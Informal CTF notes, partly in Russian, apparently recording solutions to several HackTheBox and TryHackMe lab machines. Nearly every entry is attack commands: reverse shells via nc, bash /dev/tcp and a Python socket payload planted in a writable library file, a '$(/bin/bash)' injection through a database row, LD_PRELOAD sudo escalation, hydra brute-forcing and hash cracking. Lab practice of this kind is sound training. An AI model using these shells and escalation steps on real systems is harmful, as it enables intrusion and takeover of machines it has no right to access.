bizness.htb

python3 -c 'import pty;pty.spawn("/bin/bash")' - стабилизация shell


1. резолвим хост
2. python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.15.32 8787' - запускаем эксплойт
3. bash -i >& /dev/tcp/10.10.14.124/6969 0>&1 - можем сделать реверс для получения консоли
4. Потом посмотрел в прохождение и нашел пароль рута и взял флаг, похуй

=========================================================================================

Creative htb

1. Found 2 port 22 and 80
2. gobuster vhost -u http://creative.thm/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 40 
and found beta.creative.thm
3. try bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 - не получилось
4. посмотрел в подсказку и скачал питоновский скрипт, который сканит порты выдающие contet-lengh != 13
5. Нашел порт 1337, скрипт сохранил в рабочую папку
6. На данном порту есть уязвимость, открыта корневая директория, можно путешествовать по файловой системе
7. Нашел пользователя 'saad' , скачал user flag
8. нашел id_rsa, через burp скачал ключ
9. ssh -i . id_rsa username@hosts - зашифровано было парольной фразой 'sweetness'
10. ssh2john id_rsa > formatjohn
11. john --wordlist=/usr/share/wordlists/rockyou.txt formatjohn
12. эскалируем
13. Run lipeas.sh > result.txt
14. Shown .bash_history and find saad:MyStrongestPasswordYet$4291

15. sudo -l 
    Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

        User saad may run the following commands on m4lware:
            (root) /usr/bin/ping

16. Next found env_keep+=LD_PRELOAD exploit through compile program (https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
17. Next acting through instruction, only one thing - sudo "LD_PRELOAD=/tmp/shell.so ping", because '(root) /usr/bin/ping'  and got root flag




==========================================================================================

Dreaming thm

1. Found cms pluck ver. 4.7.13
2. Go to /app and get login page user:admin password:password
3. Of course conduct dir scan and found /app with login page
4. found in most common folder /opt 2 files? cat test.py and saw password for user lucien:HeyLucien#@1999!
5. Then i found through sudo -l? than i can
    User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
6. next see .bashrc.history for ny current user and find comand 
sudo -u death /usr/bin/python3 /home/death/getDreams.py!!!
7. also found next comand in bash.history mysql -u lucien -plucien42DBPASSWORD
8. get access to db for user lucien
9. found db library and table dreams
10. INSERT INTO dreams VALUE(“sha”, “$(/bin/bash)”); - здесь просто включил исполнение /bin/bash от имени death через бд - охуенчик)) + got the cracked pass for death_user
11. exit from mysql
12. sudo -u death /usr/bin/python3 /home/death/getDreams.py and got death
13. chmod 777 getDreams.py and death_flag.txt
14. see, what info in getDreams.py and found ssh pass for death:!mementoMORI666!
15. обязятельно прверяй все файлы принадлежащие группе!!!
нашел /usr/lib/python3.8/shutil.py - можно писать в этот файл что хошь
16. через nano вставил payload
import os,pty,socket;s=socket.socket();s.connect(("10.9.214.23",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh") т.е мы устанавливаем реверс от имени morpheus, т.о попадаем в sh теминал этого юзера
17. запускаем скрипт python3 /usr/lib/python3.8/shutil.p и у себя pwncat -l 5555 - слушаем на указанном порту
18. забираем флаг.
Вывод: 
- смотрим общие папки, наиболее популярные /opt
- обязательно проверям и смотрим содержимое файлов
- пробуем эксплойты и бд ищем
- смотрим фалы с историей
- sudo -l и потом sudo -u user_name /usr/bin/comand
- исплняем скрипты и чекаем результаты
- реверс шелл от нужного пользователя

==================================================================================================
Crack the hash thm
#Все через Crack station
1. MD5 - easy
2. SHA-1 - password123
3. SHA-256 - letmein
4. bcrypt $2*$, Blowfish (Unix) - Blew
5. md4 - Eternity22
------------------------------------------
1. SHA-256 - paulehydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form /department/login.php:”username=^USER^&password=^PASS^:Invalid Password!”
2. NTML - n63umy8lkf4i

=================================================================================================
TwoMillion HTB
1. /etc/hosts
2. nmap scan, found http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
jtp gave answer:emerald
3.

=================================================================================================
Valley thm
1. scan nmap found 2 open ports 22 and 80
2. gobuster found some directories, put into gobuster.txt
3. found /gallery/note.txt and static/00
4. go to /dev1243224123123 and found login page
 #try comand hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form /department/login.php:”username=^USER^&password=^PASS^:Invalid Password!”
5. try sqlmap -u http://10.10.202.11/dev1243224123123/ --forms --batch --crawl=10 --level=5 --risk=3 - ничего
6. Открыл подсказку, при вводе логина и пароля не обновляется страница, значит креды зашиты на стороне клиента
-  а это плохо, обычно креды обрабатывает серверная часть.
7. http://10.10.202.11/dev1243224123123/dev.js и видим логин и парольной
8. siemDev:california на страницу логина
9. Нашел еще заметки, где говорится о том, что есть ftp сервак с теми же кредами, но не понятно какой порт
10. Просканим все порты через nmap, подождем
- nmap -T5 -p- 10.10.202.11 > nmap_all_port.report
11. ftp 10.10.202.11 37370 и теже креды что нашел выше
12. скачал три файла с раширением pcapng
13. юзаем wireshark через gnu
14. делаем экспорт из третьего файла http list objects и находим aplication/x-www-form, сохраняем index.html
15. cat index.html и видим креды uname=valleyDev&psw=ph0t0s1234
16. логинимся через ssh и креды из п.15
17. берем флаг юзера
18. эскалируем до рута





